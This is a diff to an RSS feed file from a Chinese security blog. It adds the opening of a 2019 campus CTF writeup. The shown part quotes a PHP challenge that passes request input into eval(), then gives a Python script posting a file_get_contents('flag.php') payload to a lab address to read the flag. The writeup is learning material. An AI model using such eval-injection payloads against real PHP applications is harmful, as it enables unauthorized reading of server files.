@@ -1,1 +1,22 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ctf on not b@tk1z</title><link>https://blog.batkiz.com/tags/ctf/</link><description>Recent content in Ctf on not b@tk1z</description><generator>Hugo -- gohugo.io</generator><language>zh</language><managingEditor>batkiz@outlook.com (Jinglue)</managingEditor><webMaster>batkiz@outlook.com (Jinglue)</webMaster><copyright>by Jinglue</copyright><lastBuildDate>Fri, 19 Apr 2019 21:57:00 +0000</lastBuildDate><atom:link href="https://blog.batkiz.com/tags/ctf/index.xml" rel="self" type="application/rss+xml"/></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ctf on not b@tk1z</title><link>https://blog.batkiz.com/tags/ctf/</link><description>Recent content in Ctf on not b@tk1z</description><generator>Hugo</generator><language>zh</language><managingEditor>batkiz@outlook.com (Jinglue)</managingEditor><webMaster>batkiz@outlook.com (Jinglue)</webMaster><copyright>by Jinglue</copyright><lastBuildDate>Fri, 19 Apr 2019 21:57:00 +0000</lastBuildDate><atom:link href="https://blog.batkiz.com/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>xatuctf2019 校赛 writeup</title><link>https://blog.batkiz.com/posts/xatuctf2019-wp/</link><pubDate>Fri, 19 Apr 2019 21:57:00 +0000</pubDate><author>batkiz@outlook.com (Jinglue)</author><guid>https://blog.batkiz.com/posts/xatuctf2019-wp/</guid><description>&lt;p>2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水 23333&lt;/p>
+&lt;h2 id="web">WEB&lt;/h2>
+&lt;h3 id="你能读到-flag-吗">你能读到 flag 吗&lt;/h3>
+&lt;p>题目：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">error_reporting&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">show_source&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">@&lt;/span>$_REQUEST[&lt;span style="color:#e6db74">&amp;#39;hello&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">eval&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;var_dump(&lt;/span>&lt;span style="color:#e6db74">$a&lt;/span>&lt;span style="color:#e6db74">);&amp;#34;&lt;/span>);&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;del>谷歌之，原题，直接复制提交。&lt;/del>&lt;/p>
+&lt;p>使用 &lt;code>file_get_contents()&lt;/code> 方法获得 flag&lt;/p>
+&lt;p>python 代码如下&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>session()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>body &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;file_get_contents(&amp;#39;flag.php&amp;#39;)&amp;#34;&lt;/span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#f92672">=&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>post(&lt;span style="color:#e6db74">&amp;#34;http://192.168.1.5:23114/read.php&amp;#34;&lt;/span>, data&lt;span style="color:#f92672">=&lt;/span>body)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(r&lt;span style="color:#f92672">.&lt;/span>content)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="phpdecode">phpdecode&lt;/h3>
+&lt;p>&lt;del>直接搜 &lt;code>1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&lt;/code> 找到了别人的 wp，flag 获得。&lt;/del>&lt;/p></description></item></channel></rss>
